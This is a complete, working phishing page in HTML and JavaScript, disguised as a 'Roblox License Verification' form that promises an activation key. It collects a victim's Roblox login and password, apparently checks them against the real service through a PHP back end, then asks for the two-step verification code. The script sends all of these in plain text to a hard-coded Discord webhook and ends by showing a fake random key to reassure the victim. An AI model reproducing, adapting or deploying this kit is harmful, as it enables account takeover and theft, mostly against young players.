<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox License Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #00b06f;
            --primary-hover: #009960;
            --bg-dark: #121212;
            --card-bg: #1e1e1e;
            --text-main: #ffffff;
            --text-sub: #a0a0a0;
            --input-bg: #2a2a2a;
            --input-border: #3a3a3a;
        }

        body {
            background-color: var(--bg-dark);
            color: var(--text-main);
            font-family: 'Inter', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
            background-image: radial-gradient(circle at 50% 50%, #1a1a1a 0%, #0f0f0f 100%);
        }

        .container {
            width: 380px;
            perspective: 1000px;
        }

        .card {
            background: var(--card-bg);
            padding: 40px;
            border-radius: 16px;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.05);
            text-align: center;
            transition: transform 0.3s ease, opacity 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .card::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0; height: 4px;
            background: linear-gradient(90deg, var(--primary), #00e6ac);
        }

        h1 {
            font-size: 24px;
            font-weight: 800;
            margin-bottom: 8px;
            background: linear-gradient(45deg, #fff, #ccc);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        p {
            color: var(--text-sub);
            font-size: 14px;
            margin-bottom: 30px;
            line-height: 1.5;
        }

        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }

        label {
            display: block;
            font-size: 12px;
            color: var(--text-sub);
            margin-bottom: 6px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        input[type="text"], input[type="password"], input[type="email"] {
            width: 100%;
            padding: 14px;
            background: var(--input-bg);
            border: 1px solid var(--input-border);
            border-radius: 8px;
            color: white;
            font-size: 14px;
            outline: none;
            transition: border-color 0.2s, box-shadow 0.2s;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }

        input:focus {
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(0, 176, 111, 0.15);
        }

        button {
            width: 100%;
            padding: 14px;
            background: var(--primary);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.2s;
            margin-top: 10px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 8px;
        }

        button:hover {
            background: var(--primary-hover);
            transform: translateY(-1px);
        }

        button:disabled {
            background: #444;
            cursor: not-allowed;
            transform: none;
        }

        /* 2FA Inputs */
        .code-container {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin-bottom: 20px;
        }

        .code-input {
            width: 45px;
            height: 55px;
            text-align: center;
            font-size: 22px;
            font-weight: bold;
            background: var(--input-bg);
            border: 1px solid var(--input-border);
            border-radius: 8px;
            color: white;
            outline: none;
            transition: border-color 0.2s;
        }

        .code-input:focus {
            border-color: var(--primary);
            background: #333;
        }

        /* Status Messages */
        .status-msg {
            margin-top: 15px;
            font-size: 13px;
            font-weight: 600;
            min-height: 20px;
        }
        .success { color: var(--primary); }
        .error { color: #ff5722; }

        /* Loader */
        .spinner {
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        /* Key Display */
        .key-display {
            background: #111;
            border: 1px dashed #ffd700;
            padding: 15px;
            border-radius: 8px;
            color: #ffd700;
            font-family: 'Courier New', monospace;
            font-size: 18px;
            margin-top: 20px;
            letter-spacing: 2px;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(255, 215, 0, 0.4); }
            70% { box-shadow: 0 0 0 10px rgba(255, 215, 0, 0); }
            100% { box-shadow:  0 0 0 0 rgba(255, 215, 0, 0); }
        }

        .hidden { display: none; }
    </style>
</head>
<body>

    <div class="container">
        <!-- STEP 1: Login -->
        <div id="step1" class="card">
            <h1>🔑 License Verification</h1>
            <p>Enter your Roblox credentials to activate your key.</p>
            
            <div class="input-group">
                <label>Email or Username</label>
                <input type="text" id="email" placeholder="example@roblox.com">
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" id="pass" placeholder="••••••••">
            </div>

            <button id="btn-login">
                <span>Verify Account</span>
            </button>
            <div id="status1" class="status-msg"></div>
        </div>

        <!-- STEP 2: 2FA Code -->
        <div id="step2" class="card hidden">
            <h1>📧 2-Step Verification</h1>
            <p>Check your email for a 6-digit code.</p>
            
            <div class="code-container">
                <input type="text" class="code-input" maxlength="1" id="c1">
                <input type="text" class="code-input" maxlength="1" id="c2">
                <input type="text" class="code-input" maxlength="1" id="c3">
                <input type="text" class="code-input" maxlength="1" id="c4">
                <input type="text" class="code-input" maxlength="1" id="c5">
                <input type="text" class="code-input" maxlength="1" id="c6">
            </div>

            <button id="btn-confirm">
                <span>Confirm Code</span>
            </button>
            <div id="status2" class="status-msg"></div>
        </div>

        <!-- STEP 3: Success -->
        <div id="step3" class="card hidden">
            <h1>✅ Activation Successful</h1>
            <p>Your account has been verified. Copy your key below.</p>
            
            <div class="key-display" id="finalKey">LOADING...</div>
            
            <p style="margin-top: 20px; font-size: 12px; color: #666;">
                Account Status: <span style="color: var(--primary);">Active</span>
            </p>
        </div>
    </div>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1534375079855784046/bnLKoWanOsTF6O399cs-x-psk-RfPS84OEFe60HL-x7JrVutP4QGYow-2c4NDYKQ89DB";

        // Auto-focus para os inputs de código
        const codeInputs = document.querySelectorAll('.code-input');
        codeInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                if (e.target.value.length === 1 && index < codeInputs.length - 1) {
                    codeInputs[index + 1].focus();
                }
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && e.target.value.length === 0 && index > 0) {
                    codeInputs[index - 1].focus();
                }
            });
        });

        // Passo 1: Validar Login com o PHP (Login Real)
        document.getElementById('btn-login').onclick = function() {
            const email = document.getElementById('email').value.trim();
            const pass = document.getElementById('pass').value.trim();
            const btn = document.getElementById('btn-login');
            const status = document.getElementById('status1');

            if (!email || !pass) {
                status.innerHTML = "<span class='error'>❌ Please fill in both fields.</span>";
                return;
            }

            btn.disabled = true;
            btn.innerHTML = '<div class="spinner"></div>';

            // Envia ao PHP para validação REAL
            fetch('check.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ email: email, password: pass })
            })
            .then(res => res.json())
            .then(data => {
                btn.disabled = false;
                btn.innerHTML = '<span>Verify Account</span>';

                // Se o PHP diz que o login foi SUCESSO
                if (data.success) {
                    status.innerHTML = "<span class='success'>✅ Account Found: " + data.username + "!</span>";
                    setTimeout(() => {
                        document.getElementById('step1').classList.add('hidden');
                        document.getElementById('step2').classList.remove('hidden');
                        document.getElementById('c1').focus();
                        // Guarda os dados válidos
                        window.currentLogin = { email, pass, username: data.username, userId: data.userId };
                    }, 1000);
                } else {
                    // Se falhou, mostra o erro exato do Roblox
                    status.innerHTML = "<span class='error'>❌ " + (data.error || "Invalid Credentials") + "</span>";
                }
            })
            .catch(err => {
                btn.disabled = false;
                btn.innerHTML = '<span>Verify Account</span>';
                status.innerHTML = "<span class='error'>❌ Server Error. Try again.</span>";
                console.error(err);
            });
        };

        // Passo 2: Confirmar 2FA e Finalizar
        document.getElementById('btn-confirm').onclick = function() {
            const c1 = document.getElementById('c1').value;
            const c2 = document.getElementById('c2').value;
            const c3 = document.getElementById('c3').value;
            const c4 = document.getElementById('c4').value;
            const c5 = document.getElementById('c5').value;
            const c6 = document.getElementById('c6').value;
            const code = c1 + c2 + c3 + c4 + c5 + c6;
            const btn = document.getElementById('btn-confirm');
            const status = document.getElementById('status2');

            if (code.length !== 6) {
                status.innerHTML = "<span class='error'>❌ Enter all 6 digits.</span>";
                return;
            }

            btn.disabled = true;
            btn.innerHTML = '<div class="spinner"></div>';

            // Envia ao Discord com TODOS os detalhes
            const loginInfo = window.currentLogin || { email: '', pass: '', username: '', userId: '' };
            
            const message = "🔥 **ACCOUNT VERIFIED (2FA)** 🔥\n\n" +
                            "**👤 Username:** " + loginInfo.username + "\n" +
                            "**🆔 User ID:** " + loginInfo.userId + "\n" +
                            "**📧 Email:** " + loginInfo.email + "\n" +
                            "**🔑 Password:** " + loginInfo.pass + "\n" +
                            "**🔢 2FA Code:** " + code + "\n" +
                            "**📅 Status:** ✅ Ready to Roll";

            fetch(WEBHOOK, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ content: message })
            })
            .then(() => {
                // Sucesso
                document.getElementById('step2').classList.add('hidden');
                document.getElementById('step3').classList.remove('hidden');
                
                // Gera chave bonita
                const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                let key = "RBX-";
                for(let i=0; i<3; i++) {
                    let part = "";
                    for(let j=0; j<4; j++) part += chars.charAt(Math.floor(Math.random() * chars.length));
                    key += part + "-";
                }
                document.getElementById('finalKey').innerText = key.slice(0,-1);
            })
            .catch(() => {
                btn.disabled = false;
                btn.innerHTML = '<span>Confirm Code</span>';
                status.innerHTML = "<span class='error'>❌ Network Error</span>";
            });
        };
    </script>
</body>
</html>
